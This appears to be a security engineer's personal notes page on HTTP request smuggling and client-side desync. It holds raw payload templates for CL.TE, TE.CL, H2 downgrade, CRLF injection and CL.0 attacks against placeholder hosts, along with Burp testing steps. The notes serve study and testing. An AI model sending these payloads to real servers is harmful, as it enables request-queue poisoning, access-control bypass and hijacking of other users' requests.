@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="55f33ec7-8019-4bbd-a734-237fcfc9df29" class="page sans"><header><h1 class="page-title">HTTP Request Smuggling/Client Side Desync</h1><p class="page-description"></p></header><div class="page-body"><ul id="e8671a5d-933a-4f38-bb53-8afd9afa34fb" class="bulleted-list"><li style="list-style-type:disc">Front end and back end server don’t agree on deciphering the content encoding and content length headers?</li></ul><ul id="59672304-18ba-4425-b3b3-2761b029ffb3" class="bulleted-list"><li style="list-style-type:disc">CL:TE, TE:CL ,TE:TE</li></ul><p id="40cc8487-bb50-4124-afdc-7fe360006d3d" class="">
+</p><p id="c29ca102-cb10-4fa7-a032-f6da0d1d65a8" class="">Can we used to chain with</p><ul id="5254f297-14c5-4c04-87dc-9cb297392a6f" class="bulleted-list"><li style="list-style-type:disc">redirect users requests to our servers (or controlled oiutputs like comment sections)</li></ul><ul id="02d1395e-6308-4535-9af2-6fef617ec101" class="bulleted-list"><li style="list-style-type:disc">CSRF</li></ul><ul id="09112432-e79e-4c10-87f1-eac75e10d523" class="bulleted-list"><li style="list-style-type:disc">Make DNS /data exfil</li></ul><ul id="dea61245-5d64-4585-bdd8-3c386cf49eaf" class="bulleted-list"><li style="list-style-type:disc">XSS</li></ul><p id="e037cb78-0591-42f0-ac02-2122f5d090df" class="">
+</p><p id="de7f8c69-07c2-4882-8275-41184f542660" class="">We are essentially sneaking in a second request within our first request to poisoin the request queue which will wait for the next person to access the page load their </p><p id="508b1862-8075-4278-95a3-503f4a52f55a" class="">
+</p><p id="fe628022-77a2-4177-8342-4e5700ffb2ad" class="">Only works with HTTP 1 requests (Must configure this in burp to test)</p><p id="ed97bb89-28cf-440e-a67b-1ca96ecbd695" class="">
+</p><p id="115898e8-a7c6-41f0-8db7-58c2e31f0526" class="">
+</p><p id="cb4d62fc-7ce7-47f0-8886-415c4285cd73" class="">
+</p><p id="c24091d6-fd1d-4754-b74e-c9129d7b860b" class="">Client side desync:</p><p id="266541e5-ac2a-4d53-8c8d-b20bb35eafd3" class="">
+</p><p id="e8fe6939-7972-4877-a2ca-695933cd8054" class="">Regular request smuggling relies on malformed HTTP requets… client side desynch utilizes the web browser to desync its own connect between front and back end servers.</p><p id="8fa04bcc-30f3-4e06-842a-ac00a07ae411" class="">
+</p><p id="8cca2049-1a53-4b52-8b76-a9f064a1484f" class="">
+</p><p id="6596d93d-9abe-43e9-9cf1-dad3dd57ab07" class="">Tricks</p><p id="7830fa62-6095-4562-aa4e-a53e46ffc765" class="">1</p><ul id="5d516e07-6cad-42db-8cb2-24405ae43309" class="bulleted-list"><li style="list-style-type:disc">Adding a valid Host: header?</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d84a1f9a-f03e-4a6d-9bc5-f99de4bcf7cb" class="code"><code class="language-XML">Host: 127.0.0.1</code></pre><ul id="b90af576-e123-4835-841c-16ef47287795" class="bulleted-list"><li style="list-style-type:disc">Adding a parameter?</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="09b04ae0-d9b4-4a7d-84a1-224de38bd93b" class="code"><code class="language-XML">x=</code></pre><p id="c29c9b06-0bea-4dcb-a914-ebe32f371ab1" class="">
+</p><p id="6994d706-0fb8-417c-bee0-52bf5eed27a3" class=""><strong>Examples:</strong></p><p id="d2c0bb36-a022-4911-b346-0bfbfc7e4ffa" class=""><strong>CL.TE</strong></p><ul id="a5eaee1e-8df3-4b46-a2d0-d71c2e38b852" class="bulleted-list"><li style="list-style-type:disc">Change request to POST and change HTTP version to 1.1…</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e0895d90-e145-4791-b350-b1f96158f167" class="code"><code class="language-XML">POST / HTTP/1.1
+Host: vuln-website.com
+Content-Type: type
+Content-Length: 35
+Transfer-Encoding: Chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: x</code></pre><p id="dff36f98-7b0d-4d22-95a6-766e74bc0455" class="">
+</p><p id="c43032d3-9f94-451e-a36e-a75901a369d9" class="">
+</p><p id="14684777-be37-45b0-9882-2091dcdd3a41" class=""><strong>TE.CL</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="88be2994-4011-41d2-a4e4-55fb7634bad1" class="code"><code class="language-XML">POST / HTTP/1.1
+Host: vuln-website.com
+Content-Type: type
+Content-Length: 35
+Transfer-Encoding: Chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: type
+Content-Length: 35
+
+x=1
+0</code></pre><p id="13b3eef8-0974-4476-8dd2-8a1a0c94fbe9" class="">
+</p><p id="fc0b4885-e2e8-4a93-b05d-9db9c306c280" class="">
+</p><p id="e1334939-e0e7-4c83-91b8-4a9d964946b2" class=""><strong>TE.TE</strong></p><ul id="ebeede54-f94a-4d94-b3d7-e03d60c801a1" class="bulleted-list"><li style="list-style-type:disc">Both frontend and backend use Transfer-Encoding</li></ul><ul id="f2dee74d-dcae-4c3a-a20c-cd36fef163ed" class="bulleted-list"><li style="list-style-type:disc">We are gonna obfuscate the TE header</li></ul><ul id="9e930e25-74f0-415f-bb36-9a233e351f78" class="bulleted-list"><li style="list-style-type:disc">Change request to POST and change HTTP version to 1.1…</li></ul><p id="fc0262f3-b734-4650-b664-e20aff68cafd" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bbd424a9-35ae-494a-b098-3c24d2b9906f" class="code"><code class="language-XML"></code></pre><p id="4e8c30cf-843c-4bb8-a2b5-a30cd965e490" class="">
+</p><p id="1811ed99-d97d-46bd-b6f9-e6d3147acac6" class="">H2.CL Request HTTP Downgrade:</p><ul id="bd36733d-a55a-4099-9161-0150236085f6" class="bulleted-list"><li style="list-style-type:disc">HTTP2 frontend processes as HTTP but HTTP1 backend see content-length header and treats as 2 seperate requests</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81faa507-187c-4197-b2cb-bd310156ffe6" class="code"><code class="language-XML">POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1GET / H</code></pre><p id="6162b19c-0536-4769-b758-121da3346bcb" class="">H2.TE Request HTTP Downgrade:</p><ul id="aacd069d-c88a-450a-8f4e-a1dc9c43b35d" class="bulleted-list"><li style="list-style-type:disc">poisioning response queue</li></ul><ul id="1b56823a-d82f-403a-8a00-10ca54d23229" class="bulleted-list"><li style="list-style-type:disc">HTTP 2</li></ul><ul id="dd2045b8-b758-4262-bb83-e558fa502e19" class="bulleted-list"><li style="list-style-type:disc">First change request method to POST and remove unnecessary headers</li></ul><ul id="2da8e411-f7bc-46a2-ab0d-8bc4095ba817" class="bulleted-list"><li style="list-style-type:disc">Turn off udpate content length in burp</li></ul><ul id="1949ebdb-4ca2-4c31-a705-47690ed41b82" class="bulleted-list"><li style="list-style-type:disc">Replace Content-Length: 0 with Transfer-Encoding: chunked</li></ul><ul id="19d8f220-ccb0-44ca-94c6-c42617667e54" class="bulleted-list"><li style="list-style-type:disc">if front end uses HTTP2 but uses 1.1 to talk to the backend, the frontend will use HTTP built in mechanism for content length… but when talking to backend it will use transfer encoding</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bfa1f074-b4c8-45a4-8b32-9307cfcd3535" class="code"><code class="language-XML">POST / HTTP/2
+Host: localhost:2368
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: x</code></pre><ul id="ce147066-f0e2-4ad1-9298-57ad5dae78e7" class="bulleted-list"><li style="list-style-type:disc">Send manipulated request then send regular request…</li></ul><ul id="29b9b353-2514-4789-86a6-60620796a99e" class="bulleted-list"><li style="list-style-type:disc">We should see the 404 response after running the regular request</li></ul><ul id="8c78fd2d-8a0d-450f-951a-23ba48c0c389" class="bulleted-list"><li style="list-style-type:disc">Try a couple times to ensure coverage</li></ul><p id="b93477ef-2689-4d98-8d08-a4ed7ea493ba" class="">
+</p><p id="12a80bfd-2134-4e0e-83f7-7335d3fe82b0" class=""><strong>CRLF Injection:</strong></p><ul id="f75d7cf3-7fb5-4574-b056-284230e5303e" class="bulleted-list"><li style="list-style-type:disc">For HTTP2?</li></ul><ul id="4440b418-6389-4ab3-9524-91490af04364" class="bulleted-list"><li style="list-style-type:disc">Change request type to POST</li></ul><ul id="6f846ce5-f86a-4c82-bbf2-7084d5b99d64" class="bulleted-list"><li style="list-style-type:disc">In burp manually add a request header in the following way to create a kettled request</li></ul><ul id="c52cad3c-db86-4a77-b9c6-fe73b63efe54" class="bulleted-list"><li style="list-style-type:disc">This injects a carriage return line feed into the request</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2e2ca391-bbd0-47c2-ab8e-60ad19037713" class="code"><code class="language-XML">Foo: bar\r\nTransfer-Encoding: chunked</code></pre><ul id="23c5f2f7-243f-4199-8833-51ee15e1e386" class="bulleted-list"><li style="list-style-type:disc">Send manipulated request the send regular homepage request right after</li></ul><p id="9582a8c2-f355-4a85-a66f-30a4ac29d7ac" class="">
+</p><p id="3e909f2d-23e6-4b96-aa02-e1f792136227" class=""><strong>CRLF Request Splitting:</strong></p><ul id="b2d8e0ef-266c-49e6-8f95-bf1531a33819" class="bulleted-list"><li style="list-style-type:disc">Create a kettled request and split the request</li></ul><p id="dea5a605-7d2f-4fda-88d6-8d7a3c1d449f" class="">This:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="53d3acbe-4354-4a2d-ba8f-3df9fd719624" class="code"><code class="language-XML">Foo: bar\r\n
+\r\n
+GET /404 HTTP/1.1
+Host: vulnerable-website.com\r\n</code></pre><p id="e4ce1705-3bf9-4d40-9464-f15f0f9b1190" class="">OR this</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5200a8b-a94d-476e-be2f-667c41b59bd1" class="code"><code class="language-XML">Foo: bar\r\n
+\r\n
+GET /404 HTTP/1.1
+Host: vulnerable-website.com\r\n
+\r\n</code></pre><p id="3ad12501-f9b7-48ad-bc37-796de52d410b" class="">
+</p><p id="7692275c-ca49-467b-8c5a-f2e726d82620" class=""><strong>Client Side:</strong></p><p id="1443e85c-2e87-4cb7-b64a-029aac6e4a00" class="">
+</p><p id="b143210a-61de-4dec-af86-e13307fc05f1" class="">
+</p><p id="3250d278-813d-4386-a962-8a52812bef67" class=""><strong>CL.0 Attack:</strong></p><ul id="3ff4d08c-937b-4bba-84db-b21d0c9c2644" class="bulleted-list"><li style="list-style-type:disc">This occurs when we can use the Content-Length header with a body that wont be processed by the front end because it is expecting a request that has no body…</li></ul><ul id="18cad8fc-ce5c-46dc-aa5f-c9b4d1cf5998" class="bulleted-list"><li style="list-style-type:disc">So once we hit the back end server it treats the requests body as a second request!</li></ul><ul id="d60285f8-f9ae-41c2-9609-97ff48fdcf58" class="bulleted-list"><li style="list-style-type:disc">Impact: we can bypass this life admin page restrictions and firewalls possibly… otherwise must be chained with XSS or CSRF for any impact really.</li></ul><ul id="ddd3a985-eaef-4a43-9ef1-43e49d2793dc" class="bulleted-list"><li style="list-style-type:disc">Switch the GET request to POST and change HTTP version to 1.1</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e3d72644-89c3-49b3-a1c6-46fd6da6ff1a" class="code"><code class="language-XML">POST /vuln-endpoint HTTP/1.1
+Host: vuln-website.com
+Content-Length: 34
+
+POST /another-endpoint HTTP/1.1
+Foo: boo *The next request recieved by the server will be appended starting here*
+
+</code></pre><p id="f19deff0-311d-4b16-8eb4-65d133aebddd" class="">
+</p><p id="1b8f592f-6cdc-4b7d-9179-182863e72eb6" class="">Client Side Desync</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f5b9f6f3-cd31-4f61-9c09-d091c0d83c43" class="code"><code class="language-XML"></code></pre></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
